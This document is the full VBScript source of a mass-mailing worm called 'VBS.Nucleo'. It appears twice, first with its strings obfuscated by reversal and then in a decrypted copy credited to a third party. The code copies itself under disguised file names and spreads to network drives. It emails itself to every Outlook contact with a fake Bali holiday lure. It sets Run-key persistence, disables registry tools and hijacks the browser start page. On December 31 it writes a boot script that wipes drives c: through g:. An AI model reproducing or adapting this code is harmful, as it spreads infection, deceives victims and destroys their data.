   'VBS.Nucleo
   'Author    : Spidey [SECTOR-S]
   'Origin    : Surabaya, Indonesia
   On Error Resume Next
   Set SBY = CreateObject("Scripting.FileSystemObject")
   Bs = SBY.OpenTextFile(Wscript.ScriptFullName).ReadAll
   Set SURO = CreateObject("WScript.Shell")
   Set BOYO = SBY.GetFile(Wscript.ScriptFullName)
   'Buat File
   Set Wr =SBY.CreateTextFile("Fung.exe",1)
   Wr.WriteLine "Function B(Tek):B = Strreverse(Tek):End Function"
   Wr.Close
   Gg = SBY.OpenTextFile("Fung.exe").ReadAll
   execute Gg
   'Folders and Files
   Startup = SURO.SpecialFolders(B("putratS"))
   Desktop = SURO.SpecialFolders(B("potkseD"))
   Set Win = SBY.GetSpecialFolder(0)
   Set Sys = SBY.GetSpecialFolder(1)
   SFile = Startup & B("sbv.exe.toobtsaf\")
   DFile = Desktop & B("sbv.gepm.acinoM_sengA\")
   MFile = Win & B("sbv.rcs.oelcuN\")
   BFile = Sys & B("sbv.tad.ptfteni\")
   If MFile <> B("sbv.rcs.oelcuN\") Then
   SBY.CopyFile BOYO, MFile
   End If
   If BFile <> B("sbv.tad.ptfteni") Then
   SBY.CopyFile BOYO, BFile
   End If
   If DFile <> B("sbv.gepm.acinoM_sengA") Then
   SBY.CopyFile BOYO, DFile
   End If
   If SFile <> B("sbv.exe.toobtsaf\") Then
   SBY.CopyFile BOYO, SFile
   End If
   'Network
   Set SUNET = CreateObject(B("krowteN.tpircSW"))
   Set BONET = SUNET.EnumNetworkDrives
   If BONET.Count <> 0 Then
   For Netnya = 0 To BONET.Count - 1
   If InStr(BONET.Item(Netnya), "\") <> 0 Then
   SBY.CopyFile BOYO, SBY.BuildPath(BONET.Item(Netnya)), B("sbv.tad.ptfteni\")
   SBY.CopyFile BOYO, SBY.BuildPath(BONET.Item(Netnya)), B("sbv.gepm.acinoM_sengA\")
   End If
   Next
   End If
   'Happy New Year
   If Day(Now()) = 31 and Month(Now()) = 12 then
   MsgBox B(" raeY weN yppaH")& Year(Now()),4160, Year(Now())
   BatDeltree()
   End If
   'Mas Mailer
   Set Wr = SBY.CreateTextFile(B("exe.eoJsaM"),1)
   Wr.WriteLine B("oelcuN.SBV'")
   Wr.WriteLine B("fI dnE:txeN:txeN:dneS.liamEkooltuO:eurT = timbuSretfAeteleD.liamEkooltuO:emaNlluFtpircS.tpircSW ddA.stnemhcattA.liamEkooltuO:"" ): !!! tujnal hibel kutnu tnemhcatta acaB"" & fLrCbv & "",hunep nalub 1 amales ILAB ualup ek sitarg atasiw tekap naktapadnem adna tamaleS"" = ydoB.liamEkooltuO:""RUOT ILAB"" = tcejbuS.liamEkooltuO:)puorGresU(seirtnEsserddA.hctiwStcatnoC ddA.stneipiceR.liamEkooltuO:)0(metIetaerC.ppAkooltuO = liamEkooltuO teS:tnuoC.seirtnEsserddA.hctiwStcatnoC oT 1 = puorGresU roF:stsiLsserddA.)""IPAM""(ecapSemaNteG.ppAkooltuO nI hctiwStcatnoC hcaE roF:nehT """" = ppAkooltuO toN fI:)""noitacilppA.kooltuO""(tcejbOetaerC = ppAkooltuO teS")
   Wr.Close
   Mas = SBY.OpenTextFile(B("exe.eoJsaM")).ReadAll
   execute Mas
   'Fake...
   Set Psn = SBY.CreateTextFile(Desktop & B("cod.oelcuN\"),1)
   Psn.WriteLine B("? paleg malad nakumet umak gnay apA") & vbCrLf & B("? paleg malad nakasar umak gnay apA") & vbCrLf & B("? paleg malad irac umak naka gnay apA") & vbCrLf & B("? apA") & vbCrLf & B("? apais") & vbCrLf & B("? anamid") & vbCrLf & B("? apareb maj") & vbCrLf & B("? napak") & vbCrLf & B("? anamig") & vbCrLf & B("? apanek") & vbCrLf & B("? ayi apa") & vbCrLf & B("!? halhatne") & vbCrLf & B("? apagnem") & vbCrLf & vbCrLf & vbCrLf & B("..........aaaaaaahahauH") & vbCrLf & B("..........aaaaaaahahauH") & vbCrLf & B("..........aaaaaaahahauH") & vbCrLf & B("..........aaaaaaahahauH")
   Psn.Close
   'Infect registry
   SURO.RegWrite B("detcefnI\ruyS\erawtfoS\MLKH"), B("oelcuN.SBV htiw")
   SURO.RegWrite B("nigirO\ruyS\erawtfoS\MLKH"), B("aisenodnI ,ayabaruS")
   SURO.RegWrite B("rohtuA\ruyS\erawtfoS\MLKH"), B("]S-ROTCES[ yedipS")
   SURO.RegWrite B("toorptf\nuR\noisreVtnerruC\swodniW\tfosorciM\erawtfoS\MLKH"), MFile
   SURO.RegWrite B("gldmoC\nuR\noisreVtnerruC\swodniW\tfosorciM\erawtfoS\UCKH"), BFile
   SURO.RegWrite B("bupteni\ecnOnuR\noisreVtnerruC\swodniW\tfosorciM\erawtfoS\MLKH"), MFile
   SURO.RegWrite B("slooTyrtsigeRelbasiD\metsyS\seiciloP\noisreVtnerruC\swodniW\tfosorciM\erawtfoS\UCKH"),"1",B("DROWD_GER")
   SURO.RegWrite B("eltiT wodniW\niaM\rerolpxE tenretnI\tfosorciM\erawtfoS\UCKH"),B("oelcuN.SBV yb detcefnI")
   SURO.RegWrite B("egaP tratS\niaM\rerolpxE tenretnI\tfosorciM\erawtfoS\UCKH"),B("ten.srotcesmaet.www//:ptth")
   'BatDeltree
   Sub BatDeltree()
   On Error Resume Next
   Set BatC = SBY.CreateTextFile(B("tab.cexeotuA\:c"))
   BatC.WriteLine B("oelcuN.SBV::")
   BatC.WriteLine B("slc")
   BatC.WriteLine B("±     ÛÛÛ     ÛÛÛ ÛÛÛÛÛÛÛ   ÛÛÛÛÛÛ    ÛÛ    ÛÛÛ  ÛÛÛ ohce@")& vbCrLf & B("±      ÛÛÛ   ÛÛÛ  ÛÛÛÛÛÛÛ  ÛÛÛÛÛÛÛ   ÛÛÛÛ   ÛÛÛ  ÛÛÛ ohce@") & vbCrLf & B("±       ÛÛÛ ÛÛÛ  ÛÛ   ÛÛÛ ÛÛ   ÛÛÛ  ÛÛ  ÛÛ  ÛÛÛ  ÛÛÛ ohce@") & vbCrLf & B("±±        ÛÛÛÛÛ   ÛÛ   ÛÛÛ ÛÛ   ÛÛÛ ÛÛÛ  ÛÛÛ ÛÛÛ  ÛÛÛ ohce@") & vbCrLf & B("±±          ÛÛÛ     ÛÛÛÛÛÛÛ  ÛÛÛÛÛÛÛ ÛÛÛÛÛÛÛÛ ÛÛÛÛÛÛÛÛ ohce@") & vbCrLf & B("±           ÛÛÛ       ÛÛÛÛÛ    ÛÛÛÛÛ ÛÛÛÛÛÛÛÛ ÛÛÛÛÛÛÛÛ ohce@") & vbCrLf & B("±           ÛÛÛ         ÛÛÛ      ÛÛÛ ÛÛÛ  ÛÛÛ ÛÛÛ  ÛÛÛ ohce@") & vbCrLf & B("±           ÛÛÛ         ÛÛÛ      ÛÛÛ ÛÛÛ  ÛÛÛ ÛÛÛ  ÛÛÛ ohce@") & vbCrLf & B("±           ÛÛÛ         ÛÛÛ      ÛÛÛ ÛÛÛ  ÛÛÛ ÛÛÛ  ÛÛÛ ohce@") & vbCrLf & B("±           ÛÛÛ         ÛÛÛ      ÛÛÛ ÛÛÛ  ÛÛÛ ÛÛÛ  ÛÛÛ ohce@") & vbCrLf & B("±                                                      ohce@") & vbCrLf & B("±±    ÛÛÛÛÛ                    ÛÛÛÛ ÛÛÛÛÛÛÛÛÛ     ÛÛÛ  ohce@") & vbCrLf & B("±±     ÛÛÛÛÛ          ÛÛÛÛ     ÛÛÛ ÛÛÛÛÛÛÛÛÛ    ÛÛÛÛ  ohce@") & vbCrLf & B("±±      ÛÛÛÛÛ         ÛÛÛÛ    ÛÛÛ Û     ÛÛÛ   ÛÛÛÛÛ  ohce@") & vbCrLf & B("±±       ÛÛÛÛÛ        ÛÛÛÛ   ÛÛÛ   Û   ÛÛÛ  ÛÛ ÛÛÛ  ohce@") & vbCrLf & B("±±±       ÛÛÛÛÛ      ÛÛÛÛÛ  ÛÛÛ   ÛÛÛÛÛÛÛ ÛÛ  ÛÛÛ  ohce@") & vbCrLf & B("±±±        ÛÛÛÛ    ÛÛÛÛÛÛ ÛÛÛ   Û   ÛÛÛÛÛ   ÛÛÛ  ohce@") & vbCrLf & B("±±±          ÛÛÛÛÛÛÛÛ  ÛÛÛÛÛÛ Û     ÛÛÛÛ    ÛÛÛ  ohce@") & vbCrLf & B("±±±              ÛÛÛÛÛÛ   ÛÛÛÛÛ ÛÛÛÛÛÛÛÛÛ     ÛÛÛ  ohce@") & vbCrLf & B("±±                 ÛÛÛÛÛ    ÛÛÛÛ ÛÛÛÛÛÛÛÛÛ    ÛÛÛÛÛ ohce@") & vbCrLf & B("±±   ÛÛÛÛÛÛ                                          ohce@") & vbCrLf & B("±±   ÛÛÛÛÛÛÛÛ      ÛÛÛÛÛÛÛ ÛÛÛÛÛÛÛÛÛÛ ÛÛÛ         ÛÛÛ ohce@") & vbCrLf & B("±   ÛÛÛÛÛÛÛÛÛÛ    ÛÛÛÛÛÛÛÛ ÛÛÛÛÛÛÛÛÛÛÛ ÛÛÛÛ    ÛÛÛÛÛ  ohce@") & vbCrLf & B("±±  Û      ÛÛÛ   ÛÛ    ÛÛÛ Û       ÛÛÛÛ ÛÛÛÛ  ÛÛÛÛ    ohce@") & vbCrLf & B("±±         ÛÛ   ÛÛ    ÛÛÛ          ÛÛÛÛ  ÛÛÛÛÛÛÛ     ohce@") & vbCrLf & B("±   ÛÛÛÛÛÛÛ     ÛÛÛÛÛÛÛÛ      ÛÛÛÛÛÛÛÛÛ  ÛÛÛÛ       ohce@") & vbCrLf & B("±±  ÛÛÛÛÛÛÛ       ÛÛÛÛÛÛÛ       ÛÛÛÛÛÛÛÛÛ   ÛÛÛ      ohce@") & vbCrLf & B("±±  ÛÛÛ            ÛÛÛ ÛÛÛ             ÛÛÛÛÛ  ÛÛÛ     ohce@") & vbCrLf & B("±   ÛÛ      Û    ÛÛÛÛ  ÛÛÛ Û             ÛÛÛÛ   ÛÛÛ   ohce@") & vbCrLf & B("±   ÛÛÛ     ÛÛ ÛÛÛÛ    ÛÛÛ ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ   ÛÛÛ  ohce@") & vbCrLf & B("±    ÛÛÛÛÛ ÛÛÛÛÛÛ      ÛÛÛ ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ   ÛÛÛ ohce@") & vbCrLf & B("±     ÛÛÛÛÛÛ                                          ohce@") & vbCrLf & B("±±     ÛÛÛÛ     ±±±±±±±±±±±±±±±                       ohce@") & vbCrLf & B("±±±         ±±±±              ±±±±±±             ±±± ohce@") & vbCrLf & B("±±±±±±±±±±±                      ±±         ±±±±   ohce@") & vbCrLf & B("±±±±±±±±±±±      ohce@")
   BatC.WriteLine B(".ohce@") & vbCrLf & B(".........................................hahahahaahahahahahahahahahauH ohce@")
   BatC.WriteLine B(":c y/ eertled") & vbCrLf & B(":d y/ eertled") & vbCrLf & B(":e y/ eertled") & vbCrLf & B(":f y/ eertled") & vbCrLf & B(":g y/ eertled") & vbCrLf
   BatC.Close
   End Sub
   SBY.DeleteFile(B("exe.gnuF"))
   SBY.DeleteFile(B("exe.eoJsaM"))

   ' Original Source Code decrypted by PetiK - 19/07/2009

   'VBS.Nucleo
   'Author    : Spidey [SECTOR-S]
   'Origin    : Surabaya, Indonesia
   On Error Resume Next
   Set SBY = CreateObject("Scripting.FileSystemObject")
   Bs = SBY.OpenTextFile(Wscript.ScriptFullName).ReadAll
   Set SURO = CreateObject("WScript.Shell")
   Set BOYO = SBY.GetFile(Wscript.ScriptFullName)
   'Buat File
   Set Wr =SBY.CreateTextFile("Fung.exe",1)
   Wr.WriteLine "Function B(Tek):B = Strreverse(Tek):End Function"
   Wr.Close
   Gg = SBY.OpenTextFile("Fung.exe").ReadAll
   execute Gg
   'Folders and Files
   Startup = SURO.SpecialFolders("Startup")
   Desktop = SURO.SpecialFolders("Desktop")
   Set Win = SBY.GetSpecialFolder(0)
   Set Sys = SBY.GetSpecialFolder(1)
   SFile = Startup & "\fastboot.exe.vbs"
   DFile = Desktop & "\Agnes_Monica.mpeg.vbs"
   MFile = Win & "\Nucleo.scr.vbs"
   BFile = Sys & "\inetftp.dat.vbs"
   If MFile <> "\Nucleo.scr.vbs" Then
   SBY.CopyFile BOYO, MFile
   End If
   If BFile <> "inetftp.dat.vbs" Then
   SBY.CopyFile BOYO, BFile
   End If
   If DFile <> "Agnes_Monica.mpeg.vbs" Then
   SBY.CopyFile BOYO, DFile
   End If
   If SFile <> "\fastboot.exe.vbs" Then
   SBY.CopyFile BOYO, SFile
   End If
   'Network
   Set SUNET = CreateObject("WScript.Network")
   Set BONET = SUNET.EnumNetworkDrives
   If BONET.Count <> 0 Then
   For Netnya = 0 To BONET.Count - 1
   If InStr(BONET.Item(Netnya), "\") <> 0 Then
   SBY.CopyFile BOYO, SBY.BuildPath(BONET.Item(Netnya)), "\inetftp.dat.vbs"
   SBY.CopyFile BOYO, SBY.BuildPath(BONET.Item(Netnya)), "\Agnes_Monica.mpeg.vbs"
   End If
   Next
   End If
   'Happy New Year
   If Day(Now()) = 31 and Month(Now()) = 12 then
   MsgBox "Happy New Year "& Year(Now()),4160, Year(Now())
   BatDeltree()
   End If
   'Mas Mailer
   Set Wr = SBY.CreateTextFile("MasJoe.exe",1)
   Wr.WriteLine "'VBS.Nucleo"
   Wr.WriteLine B("fI dnE:txeN:txeN:dneS.liamEkooltuO:eurT = timbuSretfAeteleD.liamEkooltuO:emaNlluFtpircS.tpircSW ddA.stnemhcattA.liamEkooltuO:"" ): !!! tujnal hibel kutnu tnemhcatta acaB"" & fLrCbv & "",hunep nalub 1 amales ILAB ualup ek sitarg atasiw tekap naktapadnem adna tamaleS"" = ydoB.liamEkooltuO:""RUOT ILAB"" = tcejbuS.liamEkooltuO:)puorGresU(seirtnEsserddA.hctiwStcatnoC ddA.stneipiceR.liamEkooltuO:)0(metIetaerC.ppAkooltuO = liamEkooltuO teS:tnuoC.seirtnEsserddA.hctiwStcatnoC oT 1 = puorGresU roF:stsiLsserddA.)""IPAM""(ecapSemaNteG.ppAkooltuO nI hctiwStcatnoC hcaE roF:nehT """" = ppAkooltuO toN fI:)""noitacilppA.kooltuO""(tcejbOetaerC = ppAkooltuO teS")
   Wr.Close
   Mas = SBY.OpenTextFile("MasJoe.exe").ReadAll
   execute Mas
   'Fake...
   Set Psn = SBY.CreateTextFile(Desktop & "\Nucleo.doc",1)
   Psn.WriteLine "Apa yang kamu temukan dalam gelap ?" & vbCrLf & "Apa yang kamu rasakan dalam gelap ?" & vbCrLf & "Apa yang akan kamu cari dalam gelap ?" & vbCrLf & "Apa ?" & vbCrLf & "siapa ?" & vbCrLf & "dimana ?" & vbCrLf & "jam berapa ?" & vbCrLf & "kapan ?" & vbCrLf & "gimana ?" & vbCrLf & "kenapa ?" & vbCrLf & "apa iya ?" & vbCrLf & "entahlah ?!" & vbCrLf & "mengapa ?" & vbCrLf & vbCrLf & vbCrLf & "Huahahaaaaaaa.........." & vbCrLf & "Huahahaaaaaaa.........." & vbCrLf & "Huahahaaaaaaa.........." & vbCrLf & "Huahahaaaaaaa.........."
   Psn.Close
   'Infect registry
   SURO.RegWrite "HKLM\Software\Syur\Infected", "with VBS.Nucleo"
   SURO.RegWrite "HKLM\Software\Syur\Origin", "Surabaya, Indonesia"
   SURO.RegWrite "HKLM\Software\Syur\Author", "Spidey [SECTOR-S]"
   SURO.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\ftproot", MFile
   SURO.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Comdlg", BFile
   SURO.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce\inetpub", MFile
   SURO.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableRegistryTools","1","REG_DWORD"
   SURO.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Main\Window Title","Infected by VBS.Nucleo"
   SURO.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","http://www.teamsectors.net"
   'BatDeltree
   Sub BatDeltree()
   On Error Resume Next
   Set BatC = SBY.CreateTextFile("c:\Autoexec.bat")
   BatC.WriteLine "::VBS.Nucleo"
   BatC.WriteLine "cls"
   BatC.WriteLine "@echo ÛÛÛ  ÛÛÛ    ÛÛ    ÛÛÛÛÛÛ   ÛÛÛÛÛÛÛ ÛÛÛ     ÛÛÛ     ±"& vbCrLf & "@echo ÛÛÛ  ÛÛÛ   ÛÛÛÛ   ÛÛÛÛÛÛÛ  ÛÛÛÛÛÛÛ  ÛÛÛ   ÛÛÛ      ±" & vbCrLf & "@echo ÛÛÛ  ÛÛÛ  ÛÛ  ÛÛ  ÛÛÛ   ÛÛ ÛÛÛ   ÛÛ  ÛÛÛ ÛÛÛ       ±" & vbCrLf & "@echo ÛÛÛ  ÛÛÛ ÛÛÛ  ÛÛÛ ÛÛÛ   ÛÛ ÛÛÛ   ÛÛ   ÛÛÛÛÛ        ±±" & vbCrLf & "@echo ÛÛÛÛÛÛÛÛ ÛÛÛÛÛÛÛÛ ÛÛÛÛÛÛÛ  ÛÛÛÛÛÛÛ     ÛÛÛ          ±±" & vbCrLf & "@echo ÛÛÛÛÛÛÛÛ ÛÛÛÛÛÛÛÛ ÛÛÛÛÛ    ÛÛÛÛÛ       ÛÛÛ           ±" & vbCrLf & "@echo ÛÛÛ  ÛÛÛ ÛÛÛ  ÛÛÛ ÛÛÛ      ÛÛÛ         ÛÛÛ           ±" & vbCrLf & "@echo ÛÛÛ  ÛÛÛ ÛÛÛ  ÛÛÛ ÛÛÛ      ÛÛÛ         ÛÛÛ           ±" & vbCrLf & "@echo ÛÛÛ  ÛÛÛ ÛÛÛ  ÛÛÛ ÛÛÛ      ÛÛÛ         ÛÛÛ           ±" & vbCrLf & "@echo ÛÛÛ  ÛÛÛ ÛÛÛ  ÛÛÛ ÛÛÛ      ÛÛÛ         ÛÛÛ           ±" & vbCrLf & "@echo                                                      ±" & vbCrLf & "@echo  ÛÛÛ     ÛÛÛÛÛÛÛÛÛ ÛÛÛÛ                    ÛÛÛÛÛ    ±±" & vbCrLf & "@echo  ÛÛÛÛ    ÛÛÛÛÛÛÛÛÛ ÛÛÛ     ÛÛÛÛ          ÛÛÛÛÛ     ±±" & vbCrLf & "@echo  ÛÛÛÛÛ   ÛÛÛ     Û ÛÛÛ    ÛÛÛÛ         ÛÛÛÛÛ      ±±" & vbCrLf & "@echo  ÛÛÛ ÛÛ  ÛÛÛ   Û   ÛÛÛ   ÛÛÛÛ        ÛÛÛÛÛ       ±±" & vbCrLf & "@echo  ÛÛÛ  ÛÛ ÛÛÛÛÛÛÛ   ÛÛÛ  ÛÛÛÛÛ      ÛÛÛÛÛ       ±±±" & vbCrLf & "@echo  ÛÛÛ   ÛÛÛÛÛ   Û   ÛÛÛ ÛÛÛÛÛÛ    ÛÛÛÛ        ±±±" & vbCrLf & "@echo  ÛÛÛ    ÛÛÛÛ     Û ÛÛÛÛÛÛ  ÛÛÛÛÛÛÛÛ          ±±±" & vbCrLf & "@echo  ÛÛÛ     ÛÛÛÛÛÛÛÛÛ ÛÛÛÛÛ   ÛÛÛÛÛÛ              ±±±" & vbCrLf & "@echo ÛÛÛÛÛ    ÛÛÛÛÛÛÛÛÛ ÛÛÛÛ    ÛÛÛÛÛ                 ±±" & vbCrLf & "@echo                                          ÛÛÛÛÛÛ   ±±" & vbCrLf & "@echo ÛÛÛ         ÛÛÛ ÛÛÛÛÛÛÛÛÛÛ ÛÛÛÛÛÛÛ      ÛÛÛÛÛÛÛÛ   ±±" & vbCrLf & "@echo  ÛÛÛÛÛ    ÛÛÛÛ ÛÛÛÛÛÛÛÛÛÛÛ ÛÛÛÛÛÛÛÛ    ÛÛÛÛÛÛÛÛÛÛ   ±" & vbCrLf & "@echo    ÛÛÛÛ  ÛÛÛÛ ÛÛÛÛ       Û ÛÛÛ    ÛÛ   ÛÛÛ      Û  ±±" & vbCrLf & "@echo     ÛÛÛÛÛÛÛ  ÛÛÛÛ          ÛÛÛ    ÛÛ   ÛÛ         ±±" & vbCrLf & "@echo       ÛÛÛÛ  ÛÛÛÛÛÛÛÛÛ      ÛÛÛÛÛÛÛÛ     ÛÛÛÛÛÛÛ   ±" & vbCrLf & "@echo      ÛÛÛ   ÛÛÛÛÛÛÛÛÛ       ÛÛÛÛÛÛÛ       ÛÛÛÛÛÛÛ  ±±" & vbCrLf & "@echo     ÛÛÛ  ÛÛÛÛÛ             ÛÛÛ ÛÛÛ            ÛÛÛ  ±±" & vbCrLf & "@echo   ÛÛÛ   ÛÛÛÛ             Û ÛÛÛ  ÛÛÛÛ    Û      ÛÛ   ±" & vbCrLf & "@echo  ÛÛÛ   ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ ÛÛÛ    ÛÛÛÛ ÛÛ     ÛÛÛ   ±" & vbCrLf & "@echo ÛÛÛ   ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ ÛÛÛ      ÛÛÛÛÛÛ ÛÛÛÛÛ    ±" & vbCrLf & "@echo                                          ÛÛÛÛÛÛ     ±" & vbCrLf & "@echo                       ±±±±±±±±±±±±±±±     ÛÛÛÛ     ±±" & vbCrLf & "@echo ±±±             ±±±±±±              ±±±±         ±±±" & vbCrLf & "@echo   ±±±±         ±±                      ±±±±±±±±±±±" & vbCrLf & "@echo      ±±±±±±±±±±±"
   BatC.WriteLine "@echo." & vbCrLf & "@echo Huahahahahahahahahahaahahahah........................................."
   BatC.WriteLine "deltree /y c:" & vbCrLf & "deltree /y d:" & vbCrLf & "deltree /y e:" & vbCrLf & "deltree /y f:" & vbCrLf & "deltree /y g:" & vbCrLf
   BatC.Close
   End Sub
   SBY.DeleteFile("Fung.exe")
   SBY.DeleteFile("MasJoe.exe")
